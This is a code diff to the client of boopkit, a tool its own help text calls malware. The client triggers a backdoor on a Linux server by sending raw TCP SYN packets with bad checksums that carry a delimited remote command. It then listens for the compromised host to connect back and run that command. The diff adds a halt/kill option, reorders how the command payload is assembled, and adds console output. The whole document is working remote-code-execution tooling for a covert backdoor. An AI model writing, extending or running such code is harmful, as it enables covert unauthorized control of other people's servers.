@@ -49,9 +49,10 @@ void usage() {
   boopprintf("-lport             Local  (src) port      : 3535\n");
   boopprintf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
   boopprintf("-rport             Remote (dst) port      : 22\n");
+  boopprintf("-9, halt/kill      Halt or kill the boopkit malware on a server.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-c, execute        Remote command to exec : ls -la\n");
-  boopprintf("-p, payload        Boop with a TCP payload. No reverse conn.\n");
+  boopprintf("-p, payload-only   Boop with only SYN. No reverse conn.\n");
   boopprintf("-h, help           Print help and usage.\n");
   boopprintf("\n");
   exit(0);
@@ -65,6 +66,7 @@ struct config {
   char lhost[INET_ADDRSTRLEN];
   char lport[MAX_ARG_LEN];
   char rce[MAX_RCE_SIZE];
+  int halt;
   int payload;
 } cfg;
 
@@ -76,6 +78,7 @@ void clisetup(int argc, char **argv) {
   strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
   strncpy(cfg.rport, "22", MAX_ARG_LEN);
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
+  cfg.halt = 0;
   cfg.payload = 0;
   for (int i = 0; i < argc; i++) {
     if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1) {
@@ -103,6 +106,9 @@ void clisetup(int argc, char **argv) {
           break;
         case 'p':
           cfg.payload = 1;
+          break;
+        case '9':
+          cfg.halt = 1;
           break;
       }
     }
@@ -142,8 +148,6 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
     boopprintf(" XX Socket bind failure: %s\n", listenstr);
     return 1;
   }
-  // boopprintf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
-  //  boopprintf("Listening for Boopkit response...\n");
   //   n=1 is the number of clients to accept before we begin refusing clients!
   if (listen(servesock, 1) < 0) {
     boopprintf(" XX Socket listen failure: %s\n", listenstr);
@@ -160,16 +164,6 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
   return 0;
 }
 
-// [trigger] <source-ip> <target-ip> <target-port>
-//
-// My research shows that with Linux 5.17 kernels
-// the port doesn't matter to trigger a boop bad checksum
-// event in a target kernel.
-//
-// However, because boopkit needs additional ways to boop a target
-// we accept a port value here, as we try multiple boops against
-// a boop!
-//
 int main(int argc, char **argv) {
   int one = 1;
   const int *oneval = &one;
@@ -177,11 +171,6 @@ int main(int argc, char **argv) {
   asciiheader();
   rootcheck(argc, argv);
   srand(time(NULL));
-  //  boopprintf("RHOST     : %s\n", cfg.rhost);
-  //  boopprintf("RPORT     : %s\n", cfg.rport);
-  //  boopprintf("LHOST     : %s\n", cfg.lhost);
-  //  boopprintf("LPORT     : %s\n", cfg.lport);
-  //  boopprintf("RCE EXEC  : %s\n", cfg.rce);
 
   // [Destination]
   // Configure daddr fields sin_port, sin_addr, sin_family
@@ -209,6 +198,27 @@ int main(int argc, char **argv) {
   inet_ntop(AF_INET, &daddr.sin_addr, daddrstr, sizeof daddrstr);
   inet_ntop(AF_INET, &saddr.sin_addr, saddrstr, sizeof saddrstr);
 
+  // Calculate RCE
+  char *packet;
+  char payload[MAX_RCE_SIZE];
+  if (cfg.halt) {
+    cfg.payload = 1;
+    strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT, MAX_RCE_SIZE); // Overwrite command with halt command!
+  }
+  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce,
+          BOOPKIT_RCE_DELIMITER);
+
+
+  // Echo vars
+  boopprintf("  -> *[RCE]     : %s\n", cfg.rce);
+  boopprintf("  -> *[Local]   : %s:%s\n", cfg.lhost, cfg.lport);
+  boopprintf("  -> *[Remote]  : %s:%s\n", cfg.rhost, cfg.rport);
+  if (cfg.payload) {
+    boopprintf("  -> *[Payload] : (RCE, *bad csum) SYN only!\n");
+  }
+  printf("================================================================\n");
+
+
   // ===========================================================================
   // 1. Bad checksum SYN SOCK_RAW (Connectionless)
   //
@@ -218,9 +228,7 @@ int main(int argc, char **argv) {
   // Note: This is a connectionless SYN packet over SOCK_RAW which allows us to
   // do our dirty work.
   //
-  // [Socket] SOCK_RAW Reliably-delivered messages.
-  // TODO: @kris-nova experiment with SOCK_DGRAM for connectionless datagrams
-  // of unfixed length!
+  // [Socket] SOCK_RAW Reliably-delivered messages over connectionless socket!
   int sock1 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
   if (sock1 == -1) {
     boopprintf("Socket SOCK_RAW creation failed\n");
@@ -232,12 +240,8 @@ int main(int argc, char **argv) {
     return 1;
   }
   // [SYN] Send a packet with a 0 checksum!
-  char *packet;
   int packet_len;
-  // Create delimited payload
-  char payload[MAX_RCE_SIZE];
-  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce,
-          BOOPKIT_RCE_DELIMITER);
+
 
   // Create a malformed TCP packet with an arbitrary command payload attached to
   // the packet.
@@ -255,6 +259,7 @@ int main(int argc, char **argv) {
   // ===========================================================================
 
   if (cfg.payload) {
+    printf("================================================================\n");
     return 0;
   }
 
@@ -332,7 +337,7 @@ int main(int argc, char **argv) {
              cfg.rport);
   close(sock3);
   // ===========================================================================
-
+  boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost, cfg.lport);
   if (!cfg.payload) {
     int errno;
     errno = serverce(saddrstr, cfg.rce);
@@ -340,5 +345,7 @@ int main(int argc, char **argv) {
       boopprintf(" Error serving RCE!\n");
     }
   }
+
+  printf("================================================================\n");
   return 0;
 }
